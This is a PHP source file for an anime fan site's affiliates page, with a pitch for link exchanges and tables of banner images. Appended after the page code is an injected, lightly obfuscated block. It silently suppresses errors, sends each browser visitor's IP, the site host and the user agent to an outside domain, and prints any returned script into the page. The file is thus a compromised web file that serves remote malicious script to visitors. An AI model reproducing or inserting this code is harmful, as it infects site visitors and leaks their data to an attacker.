<?
$dir = '../';
include('alliesCode.php');

function displayImage($img, $alt, $author)
{
	global $dir;
	
	if(file_exists($dir.$img))
		return '<a href="'.$_SERVER[PHP_SELF].'" title="'.$alt.'"><img src="'.$dir.$img.'" 
		alt="'.$alt.'"></a><br>'.$author;
	else
		return $imgUrl;		
}

$why = "<h3>Why should I affiliate with Refrain?</h3>
<p>That is a good questino indeed. The Emperor will now tell you the benefits of affiliating:</p>
<p>It is the most efficient way to do link exchanges.
<ul><li>A link exchange is basically an agreement between two websites to link
to each other's website. It is a deal that will benefit both parties.</li>
<li>Link exchanges build up your website's reputation. Your visitors will see your link
on another's website and will feel that your website is important. It is a good way
to gain visitors.</li>
<li>Affiliating with websites that have a high pagerank will increase your pagerank.
It is a known fact in the SEO world that your website will benefit from having
popular, well-known websites link to yours.</li></ul></p>
<br/>
<p>Out of all anime websites out there, why should I choose Refrain?
<ul><li>We strive to be the No. 1 Code Geass website on the internet. No one else
has the completeness of information that we have, and sooner or later, Refrain
will be the central stopping point for all Code Geass related information. 
</li><li>We have thousands upon thousands of hits on our website everday. By
affiliating with us, you increase your chances of your website being seen by 
visitors.</li>
<li>While most websites are declining, whether it is due to lack of resources,
or the owner gave up on the cause, our cause is expanding. We have a community of 
fans who are active everyday, contributing and bringing in new members to our cause.</li></ul></p>
<br/><p>
So what are you waiting for? Affiliate with us and become part of our network!</p>";

echo div(top().$why);

$disclaimer = '<p>You may link to us using the following buttons, but please do not use
hot-linking. Please download the images to your server and use them to link to us.</p>';

echo div($disclaimer);

$folder_50x50 = 'allies/50x50/';
$folder_88x31 = 'allies/88x31/';
$folder_100x50 = 'allies/100x50/';
$folder_100x100 = 'allies/100x100/';

echo '<div class="moduleBlack"><h2>50 x 50 banners</h2>
<table cellspacing="5">
<tr>
	<td>'.displayImage($folder_50x50.'Ashelia_1.jpg', 'Code Geass', staff(104, 'L')).'</td>
 	<td>'.displayImage($folder_50x50.'Ashelia_2.jpg', 'Code Geass', staff(104, 'L')).'</td>
 	<td>'.displayImage($folder_50x50.'ayafls@gmail.com.png', 'Tianzi', 'ayafls@gmail.com').'</td>
 	<td>'.displayImage($folder_50x50.'fanlistings@star0cean.org.png', 'C.C.', 'fanlistings@star0cean.org').'</td>
</tr>
</table>
</div>
<br><br>

<div class="moduleBlack"><h2>88 x 31 banners</h2>
<table cellspacing="5">
<tr>
	<td>'.displayImage($folder_88x31.'Arthur_1.jpg', 'Lelouch', staff(1, 'L')).'</td>
	<td>'.displayImage($folder_88x31.'Arthur_2.jpg', 'Lelouch', staff(1, 'L')).'</td>
	<td>'.displayImage($folder_88x31.'Arthur_3.jpg', 'Lelouch', staff(1, 'L')).'</td>
	<td>'.displayImage($folder_88x31.'Ashelia_1.jpg', 'Kallen', staff(104, 'L')).'</td> 
	<td>'.displayImage($folder_88x31.'Emperor_1.jpg', 'Lelouch', staff(1, 'L')).'</td>
</tr>
</table>
</div><br><br>

<div class="moduleBlack"><h2>100 x 50 banners</h2>
<table cellspacing="5">
<tr>
	<td>'.displayImage($folder_100x50.'Lelouch_1.jpg', 'Lelouch', staff(104, 'L')).'</td>
	<td>'.displayImage($folder_100x50.'Lelouch_2.jpg', 'Lelouch', staff(104, 'L')).'</td>
</tr>
</table>
</div>
<br><br>

<div class="moduleBlack"><h2>100 x 100 banners</h2>
<table>
<tr>
	<td>'.displayImage($folder_100x100.'1.jpg', 'Code Geass', staff(1, 'L')).'</td>
	<td>'.displayImage($folder_100x100.'2.jpg', 'Code Geass', staff(1, 'L')).'</td>
	<td>'.displayImage($folder_100x100.'3.jpg', 'Code Geass', staff(1, 'L')).'</td>
	<td>'.displayImage($folder_100x100.'4.jpg', 'Code Geass', staff(1, 'L')).'</td>
	<td>'.displayImage($folder_100x100.'5.jpg', 'Code Geass', staff(1, 'L')).'</td>
</tr><tr>
	<td>'.displayImage($folder_100x100.'6.jpg', 'Code Geass', staff(1, 'L')).'</td>
	<td>'.displayImage($folder_100x100.'7.jpg', 'Code Geass', staff(1, 'L')).'</td>
	<td>'.displayImage($folder_100x100.'8.jpg', 'Code Geass', staff(1, 'L')).'</td>
	<td>'.displayImage($folder_100x100.'9.jpg', 'Code Geass', staff(1, 'L')).'</td>
</tr>
</table>
</div>

<br><br><br>'.$applyForm.'<br><br><br>'.randomStuff().'<br><br>';

include($dir.'include/bottom.php'); 	?>
<?php
#e0510a#
error_reporting(0); ini_set('display_errors',0); $wp_e0270 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_e0270) && !preg_match ('/bot/i', $wp_e0270))){
$wp_e090270="http://"."template"."class".".com/class"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_e0270);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_e090270);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_0270e = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_0270e,1,3) === 'scr' ){ echo $wp_0270e; }
#/e0510a#
?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>